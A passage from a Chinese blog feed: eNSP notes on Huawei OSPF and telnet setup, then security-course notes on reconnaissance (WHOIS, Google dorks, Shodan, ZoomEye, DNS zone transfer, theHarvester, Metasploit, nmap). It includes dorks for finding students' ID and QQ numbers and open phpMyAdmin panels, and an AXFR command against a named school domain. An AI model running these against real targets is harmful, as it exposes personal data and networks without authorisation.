g0/0/1</span><br><span class="line">[AR 1-GigabitEthernet0/0/1]ip address 192.168.10.254 24</span><br><span class="line">[AR 1-GigabitEthernet0/0/1]quit</span><br><span class="line">[AR 1]int g0/0/0</span><br><span class="line">[AR 1-GigabitEthernet0/0/0]ip address 192.168.20.1 24</span><br><span class="line">[AR 1-GigabitEthernet0/0/0]quit</span><br></pre></td></tr></table></figure><p>AR2的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR 2</span><br><span class="line">[AR 2]int g0/0/0</span><br><span class="line">[AR 2-GigabitEthernet0/0/0]ip address 192.168.20.2 24</span><br><span class="line">[AR 2-GigabitEthernet0/0/0]quit</span><br><span class="line">[AR 2]int g0/0/1</span><br><span class="line">[AR 2-GigabitEthernet0/0/1]ip address 192.168.30.1 24</span><br><span class="line">[AR 2-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><p>AR3的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR 3</span><br><span class="line">[AR 3]int g0/0/0</span><br><span class="line">[AR 3-GigabitEthernet0/0/0]ip address 192.168.30.2 24</span><br><span class="line">[AR 3-GigabitEthernet0/0/0]quit</span><br><span class="line">[AR 3]int g0/0/1</span><br><span class="line">[AR 3-GigabitEthernet0/0/1]ip address 192.168.40.254 24</span><br><span class="line">[AR 3-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><p>然后就是正式开始配置OSPF了</p><p>配置注意点（本人踩坑过）：</p><p>1.area区域，一定要从0开始计算，一个一个往上加，不能随意，否则后面会出问题的</p><p>2.注意“router-id”和“router id”是两种不同的意思。“router-id”才是在配置ospf时所用到的</p><p>使用 “ospf router-id 1.1.1.1” 明确地指定了是在配置 OSPF 时的 Router ID，这减少了混淆的可能性。<br>“router id 1.1.1.1” 可能不够明确，因为它可能适用于多个路由协议，这可能导致配置时的不确定性。</p><p>ospf配置思路：</p><p>单区域：配置路由器，使用如ospf router-id 1.1.1.1，后进入指定的单个area，即area0一般，然后network和路由器相邻的两条链路的网段，形式为 “network 网络地址 反子网掩码”，每个路由器都进行如此配置</p><p>多区域：配置路由器，使用如ospf router-id 1.1.1.1，后进入指定的单个area，即area0一般，然后观察路由器的端口和区域，端口在那个区域，就在哪个区域里network该端口链路上的网络地址和反子网掩码，每个路由器都进行如此配置</p><p>OK，我们先来尝试看一下单区域的ospf是如何配置的</p><p>AR1的配置如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[AR 1]ospf router-id 1.1.1.1</span><br><span class="line">[AR 1-ospf-1]area 0</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]network 192.168.10.0 0.0.0.255</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]network 192.168.20.0 0.0.0.255</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]network 1.1.1.1 0.0.0.0//这一步是非必要的，如果后面想要可以直接ping 1.1.1.1 的话，是需要这一步的，但是这里还有前置配置回环地址为1.1.1.1的，然后router-id更多的是一个标记，尽量和回环地址配置一样，具体条件我在下面补充，再次提醒，非必须。</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[AR 1]int loopback 0</span><br><span class="line">[AR 1-LoopBack0]ip address 1.1.1.1 32  </span><br><span class="line">//两外的两个也进行如此配置，具体的自行更改</span><br></pre></td></tr></table></figure><p>AR2的配置如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[AR 2]ospf router-id 2.2.2.2</span><br><span class="line">[AR 2-ospf-1]area 0</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.0]network 192.168.20.0 0.0.0.255</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.0]network 192.168.30.0 0.0.0.255</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.0]network 2.2.2.2 0.0.0.0</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.0]quit</span><br></pre></td></tr></table></figure><p>AR3的配置如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[AR 3]ospf router-id 3.3.3.3</span><br><span class="line">[AR 3-ospf-1]area 0</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.0]network 192.168.30.0 0.0.0.255</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.0]network 192.168.40.0 0.0.0.255</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.0]network 3.3.3.3 0.0.0.0</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.0]quit</span><br></pre></td></tr></table></figure><p>然后开始来尝试配置多区域的ospf（单区域和多区域选一个就行，不要傻傻的配完单区域，又来跟我配置多区域，我这里只是笔记记录，不包会的）:</p><p>AR1的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[AR 1]ospf router-id 1.1.1.1</span><br><span class="line">[AR 1-ospf-1]area 0</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]network 192.168.20.0 0.0.0.255</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]network 192.168.10.0 0.0.0.255</span><br><span class="line">[AR 1-ospf-1-area-0.0.0.0]quit</span><br></pre></td></tr></table></figure><p>AR2的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[AR 2]ospf router-id 2.2.2.2</span><br><span class="line">[AR 2-ospf-1]area 0</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.0]network 192.168.20.0 0.0.0.255</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.0]quit</span><br><span class="line">[AR 2-ospf-1]area 1</span><br><span class="line">[AR 2-ospf-1-area-0.0.0.1]network 192.168.30.0 0.0.0.255</span><br></pre></td></tr></table></figure><p>AR3的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[AR 3]ospf router-id 3.3.3.3</span><br><span class="line">[AR 3-ospf-1]area 1</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.1]network 192.168.30.0 0.0.0.255</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.1]network 192.168.40.0 0.0.0.255</span><br><span class="line">[AR 3-ospf-1-area-0.0.0.1]quit</span><br></pre></td></tr></table></figure><p>要想ping通router-id的话，还是要配置loopback，方法上面有的</p><p>en…(x_x)，总共两个区域，一个area0，一个area1，图上刚开始没有标明出来，应该也能分的清楚的吧。。。(。・∀・)ノ</p><p>还有再提一下network，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">network 192.168.20.0 0.0.0.255</span><br><span class="line">or</span><br><span class="line">network 192.168.20.1 0.0.0.0</span><br></pre></td></tr></table></figure><p>看到区别了吧，一个是网络地址，一个是具体的接口IP地址，都是可以的，但建议优先选择上面一个</p><p>拓扑图比较简单，配置起来也是大差不差的，到这里如果还有问题，检查一下你pc机的配置，在检查你各个端口啥的配置或者以下命令尝试查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">disp this//进入端口，查看端口配置信息</span><br><span class="line">disp int g0/0/0//直接查看端口配置信息</span><br><span class="line">disp ip routing-table//查看路由表</span><br><span class="line">display current  //查看设备所有配置</span><br></pre></td></tr></table></figure><p>这里再额外补充一个telnet登录，继续用上面的拓扑图</p><p>首先配置交换机</p><p>LSW1的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;LSW 1&gt;sys</span><br><span class="line">[LSW 1]int e0/0/2</span><br><span class="line">[LSW 1-Ethernet0/0/2]port link-type access</span><br><span class="line">[LSW 1-Ethernet0/0/2]port default vlan 10</span><br><span class="line">[LSW 1-Ethernet0/0/2]quit</span><br><span class="line">[LSW 1]int e0/0/1</span><br><span class="line">[LSW 1-Ethernet0/0/1]port link-type access</span><br><span class="line">[LSW 1-Ethernet0/0/1]port default vlan 10</span><br><span class="line">[LSW 1]vlan 10</span><br><span class="line">[LSW 1-vlan 10]quit</span><br><span class="line">[LSW 1]int vlanif 10</span><br><span class="line">[LSW 1-Vlanif10]ip address 192.168.10.1 24//配置交换机的ip</span><br><span class="line">[LSW 1-Vlanif10]quit</span><br><span class="line">[LSW 1]ip route-static 0.0.0.0 0 192.168.10.254//配置缺省</span><br></pre></td></tr></table></figure><p>上面是只是保证基础的连通性，然后才正式开始配置telnet</p><p>AR1的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;AR 1&gt;sys</span><br><span class="line">[AR 1]telnet server enable//启用Telnet服务器</span><br><span class="line">[AR 1]user-interface vty 0 4//选择虚拟终端接口范围，从0到4。VTY（Virtual Teletype）接口通常用于远程登录，如Telnet或SSH。0到4即最多同时5个虚拟终端会话</span><br><span class="line">[AR 1-ui-vty0-4]authentication-mode  aaa//设置认证模式为AAA（Authentication, Authorization, and Accounting）。这意味着远程用户登录时，将使用AAA框架进行身份验证、授权和计费。即需要用户名和密码，设为password时，只需要密码</span><br><span class="line">[AR 1-ui-vty0-4](user privilege level 3)//设置用户权限级别为3,可进入aaa配置单个用户的权限</span><br><span class="line">[AR 1-ui-vty0-4]quit</span><br><span class="line">[AR 1]aaa//进入AAA配置模式。从这里开始，您可以配置与AAA相关的各种参数，如用户、角色、权限等。</span><br><span class="line">[AR 1-aaa]local-user service-type telnet//用于指定本地用户的接入类型为 Telnet</span><br><span class="line">[AR 1-aaa]local-user sqrt password cipher abcd (privilege level 3)//在AAA模式下，创建一个本地用户名为“sqrt”，并为其设置加密密码“abcd”。cipher 指的是密码是以加密方式存储的，可使用simple，即明文方式</span><br></pre></td></tr></table></figure><p>然后LSW1尝试telnet登录AR1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[LSW 1]quit</span><br><span class="line">&lt;LSW 1&gt;telnet 192.168.10.254</span><br><span class="line">Username:sqrt</span><br><span class="line">Password:abcd(不显示的)</span><br><span class="line">然后就登录成功了。</span><br><span class="line">&lt;AR 1&gt;</span><br></pre></td></tr></table></figure><p>欧克，就到这里吧o(<em>￣▽￣</em>)ブ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-OSPF&quot;&gt;&lt;a href=&quot;#网基实践题-OSPF&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-OSPF&quot;&gt;&lt;/a&gt;网基实践题-OSPF&lt;/h1&gt;&lt;h2 id=&quot;实验拓扑图：&quot;&gt;&lt;a href=&quot;#实验拓扑图：&quot; class=&quot;</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>米好信安课程笔记-信息收集</title>
    <link href="https://w-sqrt7.github.io/2024/03/01/mihao-note/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://w-sqrt7.github.io/2024/03/01/mihao-note/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2024-03-01T09:14:36.657Z</published>
    <updated>2024-03-05T03:00:07.917Z</updated>
    
    <content type="html"><![CDATA[<h1 id="米好信息安全课程笔记"><a href="#米好信息安全课程笔记" class="headerlink" title="米好信息安全课程笔记"></a>米好信息安全课程笔记</h1><h1 id="基础课程-信息收集"><a href="#基础课程-信息收集" class="headerlink" title="基础课程-信息收集"></a>基础课程-信息收集</h1><h2 id="课时一-WHOIS查询"><a href="#课时一-WHOIS查询" class="headerlink" title="课时一 WHOIS查询"></a>课时一 WHOIS查询</h2><p>查询域名的各种信息，如注册商，联系人，联系邮箱，创建时间，过期时间等。。。</p><p>1.网站</p><p>可直接网站上进行查询，如站长之家，whois.chinaz.com等，可自行搜索</p><p>2.whois命令行</p><p>下载链接：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois">https://docs.microsoft.com/en-us/sysinternals/downloads/whois</a></p><p>下载解压后，把whois.exe并复制到C:\Windows\System32目录下即可</p><p>基本使用方法是：whois+域名，更多方法可参考help帮助命令</p><p>Centos下安装命令如下：yum install -y whois</p><p>WHOIS命令语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois: [-4|-6] [-h host|--host=host] [-p port|--port=port] -k|query</span><br></pre></td></tr></table></figure><ul><li><code>[-4|-6]</code>: 这两个选项指定使用哪种 IP 版本进行查询。<code>-4</code> 表示使用 IPv4，而 <code>-6</code> 表示使用 IPv6。</li><li><code>[-h host|--host=host]</code>: 这个选项允许您指定用于查询的 WHOIS 服务器。通常，<code>whois</code> 命令会自动选择一个合适的服务器，但如果您知道特定的服务器更可靠或更合适，您可以使用此选项来指定。</li><li><code>[-p port|--port=port]</code>: 这个选项允许您指定用于连接到 WHOIS 服务器的端口。默认情况下，<code>whois</code> 使用标准的 WHOIS 端口。</li><li><code>-k|query</code>: 这个选项表示要查询的域名或 IP 地址。在 <code>-k</code> 之后，您应该直接跟上您想要查询的域名或 IP 地址。如果您选择使用 <code>query</code> 选项，那么您应该在 <code>query</code> 之后指定要查询的内容。</li></ul><p>一个典型的 <code>whois</code> 查询命令可能如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois -h whois.example.com example.com</span><br></pre></td></tr></table></figure><p>在这个例子中，我们指定了使用 <code>whois.example.com</code> 作为查询的 WHOIS 服务器，并查询了 <code>example.com</code> 域名的注册信息。</p><p>3.利用whois查询IP信息</p><p><a href="https://ip.rst.im/whois%E6%A3%80%E7%B4%A2IP%E5%9C%B0%E5%9D%80%E6%89%80%E5%B1%9E%E7%9A%84%E7%BD%91%E6%AE%B5%EF%BC%8CAS%E5%8F%B7%EF%BC%8C%E6%B3%A8%E5%86%8C%E6%97%B6%E9%97%B4">https://ip.rst.im/whois检索IP地址所属的网段，AS号，注册时间</a></p><p><a href="https://www.viewdns.info查询同一名下的其他网站信息/">https://www.viewdns.info查询同一名下的其他网站信息</a></p><h2 id="课时二-Google-Hacking"><a href="#课时二-Google-Hacking" class="headerlink" title="课时二 Google Hacking"></a>课时二 Google Hacking</h2><p>1.GoogleHacking是一种利用搜索引擎获取web应用程序弱点和敏感信息的手段<br>2.GoogleHacking是一种以合法的方式获取非法或未授权信息的手段。<br>3.Google Hacking是所有利用搜索引擎进行攻击的一个典型。</p><p><code>操作符</code></p><ol><li>+把Google可能忽略的字列入查询范围</li><li>-     把某个字忽略</li><li>~    同意词</li><li>*    通配符</li><li>“”   精确查找</li><li>OR  或</li></ol><p><code>关键词搜索</code></p><ol><li><p>site          搜索一个特定站点的详细内容</p></li><li><p>intitle      索网页标题中的某个特定字符串</p></li><li><p>inurl        搜索网页URL地址中的某个特定字符</p></li><li><p>filetype   搜索指定类型的文件</p></li><li><p>link          索和某个站点做了链接的所有URL</p></li><li><p>intext      搜索网页面正文内容中的某个特定字符串</p></li><li><p>info         搜索指定站点的一些基本信息</p></li><li><p>all            所有关键字前都加上all可以得到更加精确详细的信息</p></li></ol><p><code>示例</code></p><p>找出开放远程桌面Web连接的服务器<br>1.远程桌面Web-远程桌面的 Web版本<br>2.可通过口令破解攻破设置了弱口令的服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allinurl:tsweb/deault.htm site:com</span><br></pre></td></tr></table></figure><p>尝试找出学生身份证号和QQ号信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filetype:xls 身份证号 site:edu.cn</span><br><span class="line">filetype:xls QQ号 site:edu.cn</span><br></pre></td></tr></table></figure><p>查找可以未经授权就可以访问的phpMyAdmin的后台页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:.php? intext:CHARACTER_SETS,COLLATIONS,?intitle:phpmyadmin</span><br></pre></td></tr></table></figure><p>查找管理员登录页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/phpmyadmin/index.php</span><br></pre></td></tr></table></figure><h2 id="课时三-Shodan搜索引擎的介绍与使用"><a href="#课时三-Shodan搜索引擎的介绍与使用" class="headerlink" title="课时三 Shodan搜索引擎的介绍与使用"></a>课时三 Shodan搜索引擎的介绍与使用</h2><p>Shodan是一个搜索引擎，是用来搜索网络空间中在线设备的，可以通过Shodan搜索指定的设备、或者搜索特定类型的设备。<br>Shodan上最受欢迎的搜索内容是：webcam，linksys，cisconetgear，SCADA等等。</p><p>Shodan能找到的设备<br>服务器网络摄像头路由器加油站的泵交换机 Voip电话和所有数据采集监控系统公共ip的打印机</p><p>Shodan与Google的区别</p><ol><li>Google的爬虫抓取网页数据并为网页内容创建索引，然后根据pagerank显示结果</li><li>Shodan主要寻找端口并抓取拦截到的信息，然后为它们建立素引，最后显示结果。</li><li>Shodan并不像google那样为网页内容建立素引，因此它是一个基于拦截器的搜索引擎</li></ol><p><code>搜索语法</code></p><ol><li>hostname：搜索主机或域名，例如hostname:”google”</li><li>port：搜索指定的端口或服务，例如port:”21”</li><li>country：搜索指定的国家，例如country:”CN</li><li>city：搜索指定的城市，例如city:”Hefei”</li><li>org：搜索指定的组织或公司，例如org:”google”</li><li>isp：搜索指定的ISP供应商，例如iisp:”China Telecom”</li><li>product：搜索指定的操作系统&#x2F;软件&#x2F;平台，例product:”Apache httpd”</li><li>version：搜索指定的软件版本，例如version:”1.6.2”</li><li>geo：搜索指定的地理位置，例如geo:”31.8639,117.2808”</li><li>net：搜索指定的IP地址或子网，例如net:”210.45.240.0&#x2F;24”</li><li>before&#x2F;after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如before:”11-11-15”</li></ol><p><code>示例</code></p><p>查找位于合肥的Apache服务器：apache city:”Hefei”</p><p>查找指定网段的华为设备：huawei net:”61.191.146.0&#x2F;24”</p><p>shodan搜索框里输入指定的日标，可以是IP地址或者域名</p><h2 id="课时四-ZoomEye搜索引擎的介绍与使用"><a href="#课时四-ZoomEye搜索引擎的介绍与使用" class="headerlink" title="课时四 ZoomEye搜索引擎的介绍与使用"></a>课时四 ZoomEye搜索引擎的介绍与使用</h2><p>ZoomEye，它是一个搜索引擎，搜索对象是网络空间中的 WEB服务组件” 和 网络设备，为白帽子黑客和极客服务的，兼顾宏观和微观，支持公网设备指纹检和Web指纹检索</p><p>可识别的网络设备：交换机，路由器，摄像头，手机，平板电脑，工控设备……</p><p><code>ZoomEye的搜索语法</code><br>1.搜应用&#x2F;版本，比如php:5.3.*</p><p>2.搜国家&#x2F;城市，比如php:5.3.17city:beijing 或 php:5.3.17country:CN</p><p>3.搜网站标题，比如title:Nginx</p><p>4.搜网站域名，如site:*.baidu.com</p><p>5.特殊词语，如hackedby</p><p>6.搜网络设备，如GoAhead-Webs</p><p><code>示例</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Dedecms Country:CN</span><br><span class="line">app:&quot;wordpress&quot;</span><br><span class="line">port:22</span><br><span class="line">os:linux</span><br><span class="line">ip:8.8.8.8</span><br></pre></td></tr></table></figure><h2 id="课时五-在线社工库密码收集"><a href="#课时五-在线社工库密码收集" class="headerlink" title="课时五 在线社工库密码收集"></a>课时五 在线社工库密码收集</h2><p>拖库</p><p>指的是骇客入侵有价值的网站，把注册用户的资料数据库全部盗走的行为，因为谐音，所以也常被称作“脱裤”</p><p>洗库</p><p>在取得大量的用户数据之后，骇客会通过一系列的技术手段和黑色产业链，将有价值的用户数据变成现金以达到非法获利的目的。这一过程被称为 “洗库”</p><p>撞库</p><p>骇客首先通过收集互联网已泄露的用户+密码信息，生成对应的字典表然后用字典中罗列的用户和密码，尝试批量登陆其他网站，这样，一旦用户为了省事，在多个网站设置了同样的用户名和密码的话，骇客很容易就会通过字典中已有的信息登录到这些网站，从而相关信息</p><p>！！！目前，大部分的社工库都被ban掉的，很难找到资源，但可以尝试在GitHub，Google上查找搜索可用的社工库，但注意，价格可不便宜啊！！！</p><h2 id="课时六-DNS查询"><a href="#课时六-DNS查询" class="headerlink" title="课时六 DNS查询"></a>课时六 DNS查询</h2><p> DNS（DomainNameSystem，域名管理系统）是因特网的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系</p><p><code>常用的DNS记录</code></p><p>A                   ip地址记录，记录域名对应的ip地址</p><p>AAAA            ipv6地址记录，记录域名对应的ipv6地址</p><p>CNAME         别名记录，记录一个主机的别名</p><p>MX                 邮件交换记录，记录一个邮件域名对应的ip地址</p><p>NS                  域名服务器记录，记录该域名由哪台域名服务器解析</p><p>PTR                反向记录，即从ip地址到域名的一条记录</p><p>TXT                记录域名的相关文本信息</p><p><code>DNS域传送漏洞</code></p><ol><li>DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间同步数据库，需要使用 DNS域传送</li><li>域传送是指后备服务器从主服务器贝数据，并用得到的数据更新目身数据库</li><li>若DNS服务器配置不当，可能导致名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</li></ol><p><code>DNS查询</code><br><code>nslookup命令</code></p><ol><li>输入nslookup命令进入交互式shell</li><li>server  命令参数设定查询要使用的DNS服务器</li><li>ls DOMAIN   出某个域中的所有域名，如”ls -d hzmc.edu.cn”</li><li>exit  退出程序</li></ol><p><code>dig命令</code></p><p>在Linux中可以使用dig测试DNS服务器是否存在域传送泄露<br>Dig是一个非常强大的DNS查询工具，输入”dig -h”命令即可查看帮助命令。</p><p>dig命令检测DNS域传送漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @dns.hzmc.edu.cn axfr hzmc.edu.cn</span><br></pre></td></tr></table></figure><p>使用dig命令来检测DNS域传送（AXFR）漏洞是一种安全测试方法，用于检查一个DNS服务器是否允许未经授权的区域文件传输。</p><p>如果服务器允许AXFR查询，并且你拥有足够的权限，这个命令将返回hzmc.edu.cn域名的完整DNS区域文件。区域文件包含了域中的所有DNS记录，如A记录、AAAA记录、CNAME记录等。</p><p>如果服务器不允许AXFR查询，或者你没有足够的权限，你将收到一个错误消息，通常是REFUSED或NOTAUTH。</p><p><code>攻击者可能获得的敏感信息包括：</code></p><ol><li>网络的拓扑结构，服务器集中的IP地址段</li><li>数据库服务器的IP地址，例如nwpudb2.nwpu.edu.cn</li><li>测试服务器的IP地址，例如test.nwpu.edu.cn</li><li>VPN服务器地址泄露</li><li>其他敏感服务器</li></ol><h2 id="课时七-邮箱收集"><a href="#课时七-邮箱收集" class="headerlink" title="课时七 邮箱收集"></a>课时七 邮箱收集</h2><p><code>为什么进行邮箱收集</code></p><ol><li>企业员工邮箱账号收集的手段</li><li>邮件钓鱼攻击</li><li>社会工程学攻击</li></ol><p><code>TheHarvester</code></p><p>TheHarvester是一个社会工程学工具，它通过搜索引擎、PGP服务器以及Shodan数据库收集目标的Email，子域名，主机，员名，开放端口和banner信息。<br>    下载地址：<a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><br>    此版本为修改版，增加了百度搜索引擎，无需翻墙即可使用。</p><p><code>参数说明</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. -d: Domain to search or companyname</span><br><span class="line">2. -b: data source: google， bingbingapipgp，all</span><br><span class="line">3. -f:Save thee resultsinto an HTML and XML file Cboth）</span><br><span class="line">4. -l:Limit the number of results</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python theHarvester.py -d wooyun.org -b baidu -l 500</span><br></pre></td></tr></table></figure><p>-d wooyun.org: -d 参数后面跟的是你想要查询的域名，这里是 wooyun.org。<br>-b baidu: -b 参数指定要使用的搜索引擎或其他数据源。在这里，baidu 是指使用百度搜索引擎进行搜索。theHarvester 支持多种搜索引擎和其他数据源，如 Google、Bing、Yandex、DNS记录等。<br>-l 500: -l 参数指定要返回的结果数量。在这个例子中，500 表示返回最多500条结果。</p><p><code>MSF邮箱收集模块</code><br>MSF（Metasploit）是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并对网络系统的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程</p><p>   在Metasploit中提供了许多模块，这些模块辅助安全人员完成安全测试工作,其中searchemailcollector模块，它的功能是查找搜索引擎（google、bing、yahoo），收集和某个域名有关的邮箱地址。</p><p><code>命令说明</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.启动MSF：msfconsole</span><br><span class="line">2.使用search_email_collector模块：</span><br><span class="line">     use auxiliary/gather/search_email_collector</span><br><span class="line">3.查看设置项：show options</span><br><span class="line">4.设置DOMAIN：set domain wooyun.org</span><br><span class="line">5.运行模块：run</span><br></pre></td></tr></table></figure><h2 id="课时八-主动侦查之Nmap基本用法"><a href="#课时八-主动侦查之Nmap基本用法" class="headerlink" title="课时八 主动侦查之Nmap基本用法"></a>课时八 主动侦查之Nmap基本用法</h2><p>Nmap NetworkMapper（网络映射器）”）是一款开放源代码的网络探测和安全审核的工具。 它的设计目标是快速地扫描大型网络，Nmap以新颖的方式使用原始IP报文来发现网络中存活主机的信息</p><p>Nmap同时也提供了强大且灵活的脚本引擎，它允许用户编写简单的脚本执行各种自动化的网络任务。当然Nmap也内置了许多在渗透测试中常用的脚本</p><p><code>Nmap主要功能</code><br>主机发现                       漏洞扫描与利用</p><p>端口扫描                       安全审计</p><p>指纹识别与探测   防火墙&#x2F;IDS逃逸</p><p><code>简单的网络扫描</code></p><ol><li><p>扫描单个网络：nmap 10.254.100.1或<a href="http://www.test.com/">www.test.com</a></p></li><li><p>扫描多个IP：nmap 192.168.1.1 192.168.1.3</p></li><li><p>扫描连续的IP或IP段：nmap 10.254.100.1-10.254.100.99<br>CIDR：nmap10.254.100.1&#x2F;24</p></li><li><p>扫描目标列表：namp -iL 